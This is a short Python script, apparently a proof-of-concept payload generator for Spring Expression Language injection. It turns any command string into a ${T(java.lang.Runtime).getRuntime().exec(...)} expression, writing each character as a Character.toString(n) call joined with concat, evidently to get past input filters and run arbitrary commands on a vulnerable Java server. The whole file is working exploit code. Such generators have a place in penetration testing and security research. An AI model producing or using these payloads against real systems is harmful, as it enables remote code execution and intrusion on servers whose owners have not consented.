#!/usr/bin/env python

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('message', help='encoding string')
args = parser.parse_args()

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(args.message[0])

for ch in args.message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 

poc += ')}'

print(poc)